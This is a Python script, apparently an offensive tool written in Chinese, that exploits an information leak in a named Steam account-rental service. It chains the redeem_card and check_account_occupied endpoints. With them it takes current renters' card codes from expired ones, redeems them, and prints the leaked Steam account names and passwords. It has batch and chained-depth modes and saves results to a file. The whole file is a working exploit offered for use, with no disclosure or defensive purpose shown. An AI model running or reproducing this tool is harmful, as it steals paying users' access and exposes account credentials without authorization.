#!/usr/bin/env python3
"""
Steam租号系统卡密收割器 - 交互式版
利用 check_account_occupied.php 信息泄露漏洞获取有效卡密
"""

import requests
import time
import json
import os

BASE = "https://zuhao.steamwukong.com"
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "Mozilla/5.0"})
SESSION.trust_env = False

# 彩色输出
G = "\033[92m"  # 绿
R = "\033[91m"  # 红
Y = "\033[93m"  # 黄
C = "\033[96m"  # 青
B = "\033[94m"  # 蓝
W = "\033[97m"  # 白
D = "\033[90m"  # 灰
RST = "\033[0m" # 重置


def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════╗
║                                                  ║
║   {W}⚡ Steam租号卡密收割器 ⚡{C}                       ║
║   {D}利用 check_account_occupied 信息泄露{C}           ║
║                                                  ║
╚══════════════════════════════════════════════════╝{RST}
""")


def menu():
    print(f"""{W}┌─────────────────────────────────────┐
│  {G}[1]{W} 单个卡密收割                      │
│  {G}[2]{W} 批量卡密收割                      │
│  {G}[3]{W} 链式深度收割                      │
│  {G}[4]{W} 仅查询账号占用（不兑换）          │
│  {G}[5]{W} 通过账号反查卡密                  │
│  {G}[6]{W} 查看历史结果                      │
│  {G}[0]{W} 退出                              │
└─────────────────────────────────────┘{RST}
""")


def redeem_card(card_code: str) -> dict:
    r = SESSION.post(f"{BASE}/api/redeem_card.php", data={"card_code": card_code}, timeout=15)
    return r.json()


def check_account(account: str) -> dict:
    r = SESSION.get(f"{BASE}/api/check_account_occupied.php", params={"account": account}, timeout=15)
    return r.json()


def harvest_once(card_code: str, do_redeem: bool = True) -> dict:
    """单次收割：过期卡密 → 账号 → 当前卡密 → 兑换"""
    result = {
        "expired_card": card_code,
        "leaked_account": None,
        "leaked_card": None,
        "redeem_result": None,
    }

    print(f"\n  {Y}[▸]{W} 兑换卡密: {C}{card_code}{W}")
    try:
        resp = redeem_card(card_code)
    except Exception as e:
        print(f"  {R}[✗]{W} 请求失败: {e}")
        return result

    # 未过期，直接有效
    if resp.get("success"):
        print(f"  {G}[✓]{W} 卡密有效!")
        print(f"      账号: {resp.get('account')}")
        print(f"      密码: {resp.get('password')}")
        print(f"      游戏: {resp.get('game_name')} ({resp.get('game_id')})")
        print(f"      到期: {resp.get('end_time')}")
        result["redeem_result"] = resp
        return result

    # 过期
    if not resp.get("expired"):
        print(f"  {R}[✗]{W} 卡密无效: {resp.get('error', '未知')}")
        return result

    account = resp.get("last_account")
    if not account:
        print(f"  {R}[✗]{W} 已过期但未泄露账号")
        return result

    result["leaked_account"] = account
    print(f"  {G}[✓]{W} 泄露账号: {C}{account}{W}")

    time.sleep(1)

    # 查询占用
    print(f"  {Y}[▸]{W} 查询占用: {C}{account}{W}")
    try:
        detail = check_account(account)
    except Exception as e:
        print(f"  {R}[✗]{W} 请求失败: {e}")
        return result

    occupation = detail.get("detail", {}).get("occupation")
    if not occupation:
        print(f"  {R}[✗]{W} 账号未被占用，无卡密可泄露")
        return result

    leaked_card = occupation.get("card_code")
    end_time = occupation.get("end_time", "?")
    if not leaked_card:
        print(f"  {R}[✗]{W} 占用信息中无卡密")
        return result

    result["leaked_card"] = leaked_card
    print(f"  {G}[✓]{W} 泄露卡密: {G}{leaked_card}{W}  到期: {D}{end_time}{W}")

    if not do_redeem:
        return result

    time.sleep(1)

    # 兑换泄露的卡密
    print(f"  {Y}[▸]{W} 兑换卡密: {G}{leaked_card}{W}")
    try:
        redeem_resp = redeem_card(leaked_card)
    except Exception as e:
        print(f"  {R}[✗]{W} 请求失败: {e}")
        return result

    if redeem_resp.get("success"):
        result["redeem_result"] = redeem_resp
        print(f"  {G}[✓]{W} 兑换成功!")
        print(f"      账号: {C}{redeem_resp.get('account')}{W}")
        print(f"      密码: {C}{redeem_resp.get('password')}{W}")
        print(f"      游戏: {W}{redeem_resp.get('game_name')} {D}({redeem_resp.get('game_id')}){W}")
        print(f"      到期: {D}{redeem_resp.get('end_time')}{W}")
    else:
        print(f"  {R}[✗]{W} 兑换失败: {redeem_resp.get('error', '?')}")

    return result


def save_results(results: list, filename: str = "wukong_harvest_result.json"):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\n  {D}[*] 结果已保存: {filename}{RST}")


def show_history():
    filename = "wukong_harvest_result.json"
    if not os.path.exists(filename):
        print(f"\n  {R}[✗]{W} 无历史结果文件")
        return
    with open(filename, "r", encoding="utf-8") as f:
        data = json.load(f)
    print(f"\n  {C}── 历史收割结果 ({len(data)} 条) ──{W}\n")
    for i, r in enumerate(data, 1):
        card = r.get("leaked_card", "-")
        account = r.get("leaked_account", "-")
        game = r.get("redeem_result", {}).get("game_name", "-")
        print(f"  {D}[{i}]{W} 卡密:{G}{card}{W}  账号:{C}{account}{W}  游戏:{W}{game}{W}")


def print_summary(results: list):
    valid = sum(1 for r in results if r.get("redeem_result", {}).get("success"))
    leaked = sum(1 for r in results if r.get("leaked_card"))

    print(f"\n  {C}═══════════════════════════════════════{W}")
    print(f"  {W} 总计: {len(results)}  泄露: {G}{leaked}{W}  有效: {G}{valid}{W}")

    cards = []
    for r in results:
        if r.get("leaked_card"):
            cards.append(r["leaked_card"])
    if cards:
        print(f"  {W} 卡密: {G}{', '.join(cards)}{W}")

    games = set()
    for r in results:
        g = r.get("redeem_result", {}).get("game_name")
        if g:
            games.add(g)
    if games:
        print(f"  {W} 游戏: {W}{', '.join(games)}{W}")

    print(f"  {C}═══════════════════════════════════════{RST}")


def main():
    banner()

    while True:
        menu()
        choice = input(f"  {Y}>>> {RST}").strip()

        if choice == "0":
            print(f"\n  {D}再见{RST}\n")
            break

        elif choice == "1":
            card = input(f"\n  {W}输入过期卡密: {RST}").strip().upper()
            if not card:
                continue
            r = harvest_once(card)
            save_results([r])
            print_summary([r])

        elif choice == "2":
            raw = input(f"\n  {W}输入卡密（多个用逗号/空格分隔）: {RST}").strip().upper()
            if not raw:
                continue
            cards = [c.strip() for c in raw.replace(",", " ").split() if c.strip()]
            print(f"\n  {D}[*] {len(cards)} 个卡密待处理{W}")
            results = []
            for card in cards:
                results.append(harvest_once(card))
                time.sleep(2)
            save_results(results)
            print_summary(results)

        elif choice == "3":
            raw = input(f"\n  {W}输入种子卡密（多个用逗号/空格分隔）: {RST}").strip().upper()
            if not raw:
                continue
            cards = [c.strip() for c in raw.replace(",", " ").split() if c.strip()]
            depth_str = input(f"  {W}最大深度 [5]: {RST}").strip()
            max_depth = int(depth_str) if depth_str.isdigit() else 5

            print(f"\n  {D}[*] 链式收割，最大深度: {max_depth}{W}")
            results = []
            visited_accounts = set()
            visited_cards = set(cards)
            queue = list(cards)
            d = 0

            while queue and d < max_depth:
                card = queue.pop(0)
                d += 1
                print(f"\n  {B}── 第 {d} 轮 ──{W}")
                r = harvest_once(card)
                results.append(r)

                account = r.get("leaked_account")
                new_card = r.get("leaked_card")
                if new_card and new_card not in visited_cards:
                    visited_cards.add(new_card)
                    queue.append(new_card)
                    print(f"  {Y}[*]{W} 新卡密 {G}{new_card}{W} 加入队列")

                if account:
                    visited_accounts.add(account)

                time.sleep(2)

            save_results(results)
            print_summary(results)

        elif choice == "4":
            account = input(f"\n  {W}输入Steam账号名: {RST}").strip()
            if not account:
                continue
            print(f"\n  {Y}[▸]{W} 查询: {C}{account}{W}")
            try:
                detail = check_account(account)
            except Exception as e:
                print(f"  {R}[✗]{W} 请求失败: {e}")
                continue

            occupied = detail.get("occupied", False)
            if occupied:
                occ = detail.get("detail", {}).get("occupation", {})
                print(f"  {G}[✓]{W} 状态: {R}被占用{W}")
                print(f"      卡密: {G}{occ.get('card_code', '-')}{W}")
                print(f"      开始: {D}{occ.get('start_time', '-')}{W}")
                print(f"      到期: {D}{occ.get('end_time', '-')}{W}")
            else:
                print(f"  {G}[✓]{W} 状态: {G}空闲{W}")

        elif choice == "5":
            account = input(f"\n  {W}输入Steam账号名: {RST}").strip()
            if not account:
                continue
            password = input(f"  {W}输入密码（可选，回车跳过）: {RST}").strip()

            print(f"\n  {Y}[▸]{W} 查询账号: {C}{account}{W}")
            try:
                detail = check_account(account)
            except Exception as e:
                print(f"  {R}[✗]{W} 请求失败: {e}")
                continue

            occupied = detail.get("occupied", False)
            if not occupied:
                print(f"  {R}[✗]{W} 账号未被占用，无卡密可查")
                continue

            occ = detail.get("detail", {}).get("occupation", {})
            card = occ.get("card_code")
            end_time = occ.get("end_time", "?")
            print(f"  {G}[✓]{W} 卡密: {G}{card}{W}  到期: {D}{end_time}{W}")

            if password:
                print(f"  {D}    密码: {C}{password}{W}")

            # 兑换获取完整信息
            if card:
                confirm = input(f"\n  {W}是否兑换该卡密获取完整信息? [Y/n]: {RST}").strip().lower()
                if confirm != "n":
                    time.sleep(1)
                    print(f"  {Y}[▸]{W} 兑换: {G}{card}{W}")
                    try:
                        resp = redeem_card(card)
                    except Exception as e:
                        print(f"  {R}[✗]{W} 请求失败: {e}")
                    else:
                        if resp.get("success"):
                            print(f"  {G}[✓]{W} 兑换成功!")
                            print(f"      账号: {C}{resp.get('account')}{W}")
                            print(f"      密码: {C}{resp.get('password')}{W}")
                            print(f"      游戏: {W}{resp.get('game_name')} {D}({resp.get('game_id')}){W}")
                            print(f"      到期: {D}{resp.get('end_time')}{W}")
                        else:
                            print(f"  {R}[✗]{W} {resp.get('error', '兑换失败')}")

        elif choice == "6":
            show_history()

        else:
            print(f"  {R}无效选项{RST}")

        print()


if __name__ == "__main__":
    main()
